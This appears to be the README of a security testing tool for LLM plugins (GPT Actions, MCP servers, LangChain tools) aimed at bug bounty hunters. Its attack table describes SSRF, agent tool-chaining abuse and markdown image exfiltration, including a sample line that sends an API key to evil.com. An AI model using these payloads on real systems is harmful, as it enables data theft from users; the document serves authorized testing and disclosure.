<![CDATA[<div align="center">

```
 ██╗     ██╗     ███╗   ███╗    ██████╗ ██╗     ██╗   ██╗ ██████╗ ██╗███╗   ██╗
 ██║     ██║     ████╗ ████║    ██╔══██╗██║     ██║   ██║██╔════╝ ██║████╗  ██║
 ██║     ██║     ██╔████╔██║    ██████╔╝██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
 ██║     ██║     ██║╚██╔╝██║    ██╔═══╝ ██║     ██║   ██║██║   ██║██║██║╚██╗██║
 ███████╗███████╗██║ ╚═╝ ██║    ██║     ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
 ╚══════╝╚══════╝╚═╝     ╚═╝    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝
                    ████████╗███████╗███████╗████████╗███████╗██████╗
                    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
                       ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝
                       ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
                       ██║   ███████╗███████║   ██║   ███████╗██║  ██║
                       ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

**Automated security testing for LLM plugins — GPT Actions, MCP Servers, LangChain Tools**

*Find the vulnerabilities that AI itself creates.*

[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg?style=flat-square&logo=python&logoColor=white)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg?style=flat-square)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-55%20passed-brightgreen.svg?style=flat-square&logo=pytest)](#testing)
[![Version](https://img.shields.io/badge/version-0.1.0-orange.svg?style=flat-square)](#changelog)
[![OWASP LLM Top 10](https://img.shields.io/badge/OWASP-LLM%20Top%2010-red.svg?style=flat-square)](https://owasp.org/www-project-top-10-for-large-language-model-applications/)

[Quick Start](#-quick-start) •
[Why This Tool](#-the-problem) •
[Features](#-features) •
[Bug Bounty Guide](docs/BUG_BOUNTY_GUIDE.md) •
[Attack Vectors](docs/ATTACK_VECTORS.md)

</div>

---

## 🚨 The Problem

LLMs don't just *use* tools — they **hallucinate how to use them**.

When ChatGPT calls a plugin, it can invent parameters like `is_admin: true` or `bypass_auth: true` that *aren't in the API schema* — and if the backend doesn't validate strictly, **it works**. This isn't a hypothetical. It's happening in production right now.

```
┌─────────────┐    ┌──────────────┐    ┌─────────────────┐
│  User Prompt │───▶│   LLM Brain  │───▶│  Plugin/Tool API │
│              │    │              │    │                 │
│ "Get my data"│    │ Generates:   │    │ Receives:       │
│              │    │ {             │    │ {               │
│              │    │   user_id: 1, │    │   user_id: 1,   │
│              │    │   is_admin: ▓ │◄── │   is_admin: ▓   │ ← NOT IN SCHEMA
│              │    │ }             │    │ }               │   BUT HONORED!
└─────────────┘    └──────────────┘    └─────────────────┘
```

**Traditional security tools don't catch this** because the vulnerability exists in the *gap between AI intent and API reality*.

## 🔍 What This Tool Does

LLM Plugin Tester finds exploitable flaws across the entire LLM plugin ecosystem:

| Attack Vector | Severity | What We Detect |
|:---|:---:|:---|
| 🧠 **Hallucinated Parameters** | 🔴 CRITICAL | LLM invents `admin`, `debug`, `bypass_auth` params that backends accept |
| 🌐 **SSRF via Plugins** | 🔴 CRITICAL | URL params fetching `169.254.169.254`, internal services, `file://` |
| 🖼️ **Markdown Exfiltration** | 🟠 HIGH | Zero-click data theft via `![img](https://evil.com?secret={{api_key}})` |
| ⛓️ **Tool Chaining** | 🟠 HIGH | Read DB → Email to attacker — without user approval |
| 🔓 **Over-Permissions** | 🟡 MEDIUM | Plugins requesting `execute`, `shell`, `admin` capabilities |
| 💀 **LangGrinch RCE** | 🔴 CRITICAL | LangChain deserialization → arbitrary code execution |
| 🔧 **MCP Server Abuse** | 🟠 HIGH | Filesystem access, shell execution, network pivoting |

## 💡 Why Existing Tools Miss This

| | **Burp/ZAP** | **Snyk/Semgrep** | **Garak** | **LLM Plugin Tester** |
|:---|:---:|:---:|:---:|:---:|
| SSRF in plugin params | ❌ | ❌ | ❌ | ✅ |
| Hallucinated parameters | ❌ | ❌ | ❌ | ✅ |
| Markdown exfiltration | ❌ | ❌ | ❌ | ✅ |
| MCP config audit | ❌ | ❌ | ❌ | ✅ |
| GPT Action analysis | ❌ | ❌ | ❌ | ✅ |
| Tool chain validation | ❌ | ❌ | ⚠️ Partial | ✅ |
| Bug bounty reports | ❌ | ❌ | ❌ | ✅ |

> **We're not replacing these tools.** We cover the gap they can't reach — the AI-to-API interface.

## ⚡ Quick Start

### Installation

```bash
# Clone and install
git clone https://github.com/Ak-cybe/llm-plugin-tester.git
cd llm-plugin-tester
pip install -e .

# With proxy support (mitmproxy)
pip install -e ".[proxy]"

# With dev tools
pip install -e ".[dev]"
```

### 30-Second Demo

**1. Analyze a GPT Action for vulnerabilities:**
```bash
$ llm-plugin-tester analyze -t gpt-action -m examples/malicious-gpt-action/ai-plugin.json
```
```
🔍 LLM Plugin Security Analyzer

📄 Analyzing GPT Action: examples/malicious-gpt-action/ai-plugin.json

🚨 Found 5 security issues:
  CRITICAL: 2 | HIGH: 2 | MEDIUM: 1

┌──────────┬─────────────────────┬──────────────┬──────────────────────────────────────────┐
│ Severity │ Endpoint            │ Risky Params │ Reason                                   │
├──────────┼─────────────────────┼──────────────┼──────────────────────────────────────────┤
│ CRITICAL │ POST /execute       │ command      │ Accepts potentially dangerous parameters  │
│ HIGH     │ GET /query          │ sql, url     │ Accepts potentially dangerous parameters  │
│ HIGH     │ DELETE /admin/delete│ file_path    │ Accepts potentially dangerous parameters  │
│ MEDIUM   │ POST /execute       │ -            │ Schema allows arbitrary additional props  │
│ MEDIUM   │ /*                  │ -            │ Uses API key auth: shared credentials     │
└──────────┴─────────────────────┴──────────────┴──────────────────────────────────────────┘

✅ Report saved to: reports/gpt-action-report-ai-plugin.json
```

**2. Audit an MCP server configuration:**
```bash
$ llm-plugin-tester analyze -t mcp -c examples/vulnerable-mcp-server/mcp-config.json
```
```
🚨 Found 6 security issues:
  CRITICAL: 3 | HIGH: 1 | MEDIUM: 2

┌──────────┬────────────────────┬─────────────────────┬─────────────────────────────────────┐
│ Severity │ Server             │ Issue Type          │ Description                         │
├──────────┼────────────────────┼─────────────────────┼─────────────────────────────────────┤
│ CRITICAL │ code-executor      │ DANGEROUS_PERMISSION│ Server has dangerous permission: exe │
│ CRITICAL │ database-connector │ DANGEROUS_PERMISSION│ Server has dangerous permission: adm │
│ HIGH     │ filesystem-agent   │ EXCESSIVE_FILE_ACCE │ Server has access to broad path: /   │
│ MEDIUM   │ filesystem-agent   │ CORS_WILDCARD       │ CORS wildcard allows any origin      │
└──────────┴────────────────────┴─────────────────────┴─────────────────────────────────────┘
```

**3. Start the Validation Oracle (exfiltration listener):**
```bash
$ llm-plugin-tester oracle start --port 8080

🎯 Starting Validation Oracle
   Listening on: http://0.0.0.0:8080
   Ready to catch exfiltration attempts!

# When exfiltration hits your server:
🚨 EXFILTRATION DETECTED - IMAGE_EXFILTRATION
   Severity: HIGH
   Path: /logo.png
   Query Params: {'secret': 'sk-proj-1234567890'}
```

## 🏗️ Architecture

```
llm-plugin-tester/
├── src/llm_plugin_tester/
│   ├── recon/              # Module 1: Static Analysis
│   │   ├── openapi_parser  # GPT Action / OpenAPI vulnerability scanner
│   │   └── mcp_auditor     # MCP server config security auditor
│   │
│   ├── proxy/              # Module 2: Traffic Interception
│   │   └── interceptor     # mitmproxy addon with 3 real-time detectors:
│   │       ├── HallucinationDetector  → flags params not in schema
│   │       ├── SSRFDetector           → 16 regex patterns for internal access
│   │       └── SensitiveDataDetector  → catches API keys, tokens, secrets
│   │
│   ├── oracle/             # Module 4: Validation Oracle
│   │   └── listener        # FastAPI catch-all server for proving exfiltration
│   │
│   ├── payloads/           # Attack Payload Library
│   │   └── attack_payloads # 75+ payloads across 7 categories
│   │
│   ├── cli.py              # Typer CLI with rich output
│   └── config.py           # Pydantic settings with .env support
│
├── tests/                  # 55 tests, 5 test files, 100% module coverage
├── reports/templates/      # HackerOne-ready report templates
├── docs/                   # Attack vectors guide + bug bounty playbook
└── examples/               # Intentionally vulnerable plugins for testing
```

## 🎯 Bug Bounty Integration

This tool is built for bug bounty hunters. Every finding maps directly to a report:

### Target Programs
| Platform | Focus | Est. Payout |
|:---|:---|:---:|
| [**OpenAI**](https://hackerone.com/openai) | GPT Actions, plugins | $200–$20,000 |
| [**Google**](https://bughunters.google.com) | Gemini Extensions | $500–$31,337 |
| [**Microsoft**](https://msrc.microsoft.com) | Copilot plugins | $500–$15,000 |
| **Anthropic** | MCP servers | Responsible disclosure |

### Ready-to-File Templates
- [`reports/templates/ssrf_report.md`](reports/templates/ssrf_report.md) — SSRF via plugin URL parameter (CVSS 9.0)
- [`reports/templates/markdown_exfil_report.md`](reports/templates/markdown_exfil_report.md) — Zero-click data exfiltration (CVSS 7.5)

### Workflow
```
1. Find target plugin     →  Browse plugin stores, MCP configs
2. Static analysis        →  llm-plugin-tester analyze
3. Deploy oracle          →  llm-plugin-tester oracle start
4. Test payloads          →  75+ ready-to-use attack templates
5. Generate report        →  HackerOne-ready with CVSS scores
6. Collect bounty         →  💰
```

> 📖 **Full playbook:** [Bug Bounty Integration Guide](docs/BUG_BOUNTY_GUIDE.md)

## 🧪 Testing

```bash
# Run all tests
pytest tests/ -v

# Expected output
=================== 55 passed in 2.4s ===================
```

| Test File | Tests | What's Covered |
|:---|:---:|:---|
| `test_openapi_parser.py` | 5 | GPT Action detection, risky params, auth analysis |
| `test_mcp_auditor.py` | 7 | File access, CORS, permissions, hooks |
| `test_oracle.py` | 7 | GET/POST exfiltration, severity scoring |
| `test_proxy.py` | 13 | SSRF, hallucination, sensitive data detectors |
| `test_payloads.py` | 23 | All 7 payload categories + generators |

## 🗺️ Roadmap

| Version | Status | Features |
|:---|:---:|:---|
| **v0.1** | ✅ Released | Recon engine, Oracle, Proxy detectors, 75+ payloads |
| **v0.2** | 🔧 In Progress | Live mitmproxy integration, SSRF mutation engine |
| **v0.3** | 📋 Planned | Promptfoo/Garak fuzzer integration, auto-exploit chains |
| **v1.0** | 🎯 Target | Full pipeline: discover → intercept → fuzz → report → file |

## 🤝 Contributing

We welcome contributions! Especially:

- 🆕 **New detectors** — LangChain tool analysis, CrewAI, AutoGPT
- 🧪 **Attack payloads** — Real-world exploits you've found
- 📄 **Report templates** — Additional bug bounty templates
- 🌐 **Proxy improvements** — Better mitmproxy integration

See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions.

## ⚖️ Legal & Ethics

> **This tool is for authorized security testing only.**

- ✅ Test your own plugins and integrations
- ✅ Bug bounty programs with explicit scope
- ✅ Security research with responsible disclosure
- ❌ Do NOT test production systems without authorization
- ❌ Do NOT use findings for malicious purposes

See [SECURITY.md](SECURITY.md) for our vulnerability disclosure policy.

## 📜 License

[MIT License](LICENSE) — Use freely, attribute kindly.

---

<div align="center">

**Built for the hunters who protect AI from itself.**

⭐ Star this repo if it helps you find bugs!

[Report a Bug](https://github.com/Ak-cybe/llm-plugin-tester/issues) •
[Request a Feature](https://github.com/Ak-cybe/llm-plugin-tester/issues) •
[Discussions](https://github.com/Ak-cybe/llm-plugin-tester/discussions)

</div>
]]>
